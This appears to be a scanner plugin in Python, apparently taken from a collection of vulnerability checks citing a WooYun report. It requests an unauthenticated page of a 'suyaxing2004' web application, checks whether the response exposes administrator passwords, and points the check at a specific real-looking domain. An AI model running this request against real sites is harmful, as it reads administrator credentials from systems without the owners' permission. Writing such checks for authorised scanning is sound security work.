#!/usr/bin/env python 
# -*- coding: utf-8 -*- 
#__author__ = 'ifk' 
#Refer http://www.wooyun.org/bugs/wooyun-2010-090403

def assign(service, arg): 
    if service == "suyaxing2004":
        return True, arg
		
def audit(arg): 
    payload = 'ws2004/SysManage/UserManage/SysManage/editxml.asp?ID=1'
    code, head, res, errcode, _ = curl.curl2(arg+payload)
    if code == 200 and '<PassWords>' in res:
        security_hole('Find admin passwd in '+arg+payload)
				
if __name__ == '__main__': 
    from dummy import *
    audit(assign('suyaxing2004', 'http://www.fzjcxx.cn/')[1])